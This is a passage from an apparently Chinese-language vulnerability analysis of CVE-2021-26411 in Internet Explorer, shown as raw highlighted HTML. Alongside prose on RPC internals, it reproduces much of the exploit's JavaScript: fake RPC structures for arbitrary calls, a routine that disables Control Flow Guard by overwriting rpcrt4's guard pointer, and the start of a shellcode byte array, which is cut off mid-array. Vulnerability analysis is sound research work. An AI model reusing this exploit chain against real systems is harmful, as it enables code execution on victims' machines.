class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(xyz) + <span class="hljs-number">0x18</span>, <span class="hljs-number">32</span>)<br>cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;normalize&#x27;</span>, <span class="hljs-title class_">NdrServerCall2</span>)<br></code></pre></td></tr></table></figure><p>RPC_MESSAGE结构,由图中可以看出Handle存放了一个OSF_SCALL虚表指针,Buffer位置存放了远程调用中函数的传参,RpcInterfaceInformation存放了函数接口信息,通过几个结构体包装了函数的信息,最终会指向的是函数的指针.然后最终通过NdrServerCall2进行调用.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220101724926.png" alt="image-20220220101724926"></p><p> NdrServerCall2接收参数RPC_MESSAGE,内部会调用NdrStubCall2函数</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220144905342.png" alt="image-20220220144905342"></p><p>内部在获取RPC_MESSAGE后会对函数偏移进行一些计算,以及参数做一些处理,然后进行函数调用</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145312328.png" alt="image-20220220145312328"></p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145559823.png" alt="image-20220220145559823"></p><p>第一个值Handle是OSF_SCALL 虚表指针,通过查看其引用,可以通过调用函数I_RpcTransServerNewConnection函数获取到这个虚表指针填充至handle.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145753553.png" alt="image-20220220145753553"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145819249.png" alt="image-20220220145819249"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220150046156.png" alt="image-20220220150046156"></p><p>exp中也是这样进行构造的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">aos</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-keyword">var</span> baseObj = <span class="hljs-title function_">createBase</span>()<br>          <span class="hljs-keyword">var</span> addr = baseObj.<span class="hljs-property">addr</span> + baseObj.<span class="hljs-property">size</span><br>          <span class="hljs-keyword">var</span> I_RpcTransServerNewConnection = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;I_RpcTransServerNewConnection&#x27;</span>)<br>          <span class="hljs-title function_">prepareCall</span>(addr, I_RpcTransServerNewConnection)<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">read</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">call</span>(addr) - <span class="hljs-number">0xf8</span>, <span class="hljs-number">32</span>), <span class="hljs-number">32</span>)<br>      &#125;<br><br></code></pre></td></tr></table></figure><p>然后对RPC结构进行初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">initRpc</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-keyword">var</span> data = [<span class="hljs-number">50</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">52</span>, <span class="hljs-number">0</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">68</span>, <span class="hljs-number">13</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">36</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrServerCall2</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrServerCall2&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrOleAllocate</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrOleAllocate&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrOleFree</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrOleFree&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">RPCMessageObject</span> = <span class="hljs-title function_">createArrayBuffer</span>(cbase.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x100</span>)<br>           <span class="hljs-keyword">var</span> buffer2 = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x200</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">AttributeVtable</span> = <span class="hljs-title function_">read</span>(patt, <span class="hljs-number">32</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">MSHTMLSymbolBuffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x1000</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">TransferSyntaxBuffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(syntaxObject.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> PRPC_CLIENT_INTERFACE_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> _MIDL_SERVER_INFO_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(_MIDL_SERVER_INFO_.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> rpcProcStringBuffer = <span class="hljs-title function_">createArrayBuffer</span>(data.<span class="hljs-property">length</span>)<br>           <span class="hljs-title function_">writeData</span>(rpcProcStringBuffer, data)<br>           <span class="hljs-keyword">var</span> _MIDL_STUB_DESC_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(_MIDL_STUB_DESC.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> RPC_DISPATCH_TABLE_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrServerCall2Buffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">NdrServerCall2Buffer</span>, <span class="hljs-title class_">NdrServerCall2</span>, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, osf_vft, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span> + <span class="hljs-number">4</span>, <span class="hljs-number">0x89abcdef</span>, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">32</span>)<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;__vtguard&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;__vtguard&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;SecurityContext&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;SecurityContext&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;JSBind_InstanceOf&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;JSBind_InstanceOf&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;JSBind_TypeId&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;JSBind_TypeId&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;normalize&#x27;</span>, <span class="hljs-title class_">NdrServerCall2</span>)<br>           cbase.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;pSecurityContext&#x27;</span>, <span class="hljs-title class_">RPCMessageObject</span> + <span class="hljs-number">68</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">RPCMessageObject</span> + <span class="hljs-number">76</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>)<br>           syntaxObject.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">TransferSyntaxBuffer</span>, <span class="hljs-string">&#x27;SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">2</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;RpcInterfaceInformation&#x27;</span>, PRPC_CLIENT_INTERFACE_Buffer)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pfnAllocate&#x27;</span>, <span class="hljs-title class_">NdrOleAllocate</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pfnFree&#x27;</span>, <span class="hljs-title class_">NdrOleFree</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pFormatTypes&#x27;</span>, buffer2)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;fCheckBounds&#x27;</span>, <span class="hljs-number">1</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;Version&#x27;</span>, <span class="hljs-number">0x50002</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;MIDLVersion&#x27;</span>, <span class="hljs-number">0x800025b</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;mFlags&#x27;</span>, <span class="hljs-number">1</span>)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;pStubDesc&#x27;</span>, _MIDL_STUB_DESC_Buffer)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">32</span>))<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;ProcString&#x27;</span>, rpcProcStringBuffer)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;FmtStringOffset&#x27;</span>, buffer2)<br>           <span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">set</span>(RPC_DISPATCH_TABLE_Buffer, <span class="hljs-string">&#x27;DispatchTableCount&#x27;</span>, <span class="hljs-number">1</span>)<br>           <span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">set</span>(RPC_DISPATCH_TABLE_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, <span class="hljs-title class_">NdrServerCall2Buffer</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, RPC_DISPATCH_TABLE_Buffer)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;InterpreterInfo&#x27;</span>, _MIDL_SERVER_INFO_Buffer)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;Length&#x27;</span>, <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;InterfaceId.SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">1</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;TransferSyntax.SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">2</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;Flags&#x27;</span>, <span class="hljs-number">0x4000000</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;RpcInterfaceInformation&#x27;</span>, PRPC_CLIENT_INTERFACE_Buffer)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;TransferSyntax&#x27;</span>, <span class="hljs-title class_">TransferSyntaxBuffer</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;Handle&#x27;</span>, <span class="hljs-title class_">MSHTMLSymbolBuffer</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;DataRepresentation&#x27;</span>, <span class="hljs-number">16</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;RpcFlags&#x27;</span>, <span class="hljs-number">0x1000</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;Buffer&#x27;</span>, buffer)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;BufferLength&#x27;</span>, <span class="hljs-number">48</span>)<br>           <span class="hljs-keyword">return</span> <span class="hljs-title class_">RPCMessageObject</span><br>       &#125;<br></code></pre></td></tr></table></figure><p>通过覆盖rpcrt4_guard_check_icall_fptr中保存的函数指针,修改为KiFastSystemCallRet关闭CFG保护.使其可以跳转到shellcode.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">killCfg</span>(<span class="hljs-params">addr</span>) &#123;<br>      <span class="hljs-keyword">var</span> cfgobj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CFGObject</span>(addr)<br>      <span class="hljs-keyword">if</span> (!cfgobj.<span class="hljs-title function_">getCFGValue</span>()) <span class="hljs-keyword">return</span><br>      <span class="hljs-keyword">var</span> guard_check_icall_fptr_address = cfgobj.<span class="hljs-title function_">getCFGAddress</span>()<br>      <span class="hljs-keyword">var</span> <span class="hljs-title class_">KiFastSystemCallRet</span> = <span class="hljs-title function_">getProcAddr</span>(ntdll, <span class="hljs-string">&#x27;KiFastSystemCallRet&#x27;</span>)<br>      <span class="hljs-keyword">var</span> tmpBuffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>      <span class="hljs-comment">// 修改RPCRT4!__guard_check_icall_fptr的属性为PAGE_EXECUTE_READWRITE</span><br>      <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>, tmpBuffer])<br>      <span class="hljs-comment">// 替换rpcrt4!__guard_check_icall_fptr保存的指针，修改ntdll!LdrpValidateUserCallTarget为改为ntdll!KiFastSystemCallRet</span><br>      <span class="hljs-comment">// 关闭rpcrt4的CFG检查</span><br>      <span class="hljs-title function_">write</span>(guard_check_icall_fptr_address, <span class="hljs-title class_">KiFastSystemCallRet</span>, <span class="hljs-number">32</span>)<br>      <span class="hljs-comment">// 恢复PRCRT4!__gurad_check_icall_fptr内存属性</span><br>      <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-title function_">read</span>(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])<br>      map.<span class="hljs-title function_">delete</span>(tmpBuffer)<br>  &#125;<br></code></pre></td></tr></table></figure><p>执行shellcode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">          <span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([ <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x0C</span>,<br><span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x53</span>,<br><span class="hljs-number">0x68</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8B</span>,<br><span class="hljs-number">0x49</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x75</span>,<br><span class="hljs-number">0x05</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xCD</span>,<br><span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBE</span>,<br><span class="hljs-number">0x06</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x03</span>,<br><span class="hljs-number">0xDD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>,<br><span class="hljs-number">0x33</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x53</span>,<br><span class="hljs-number">0x50</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0B</span>,<br><span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span 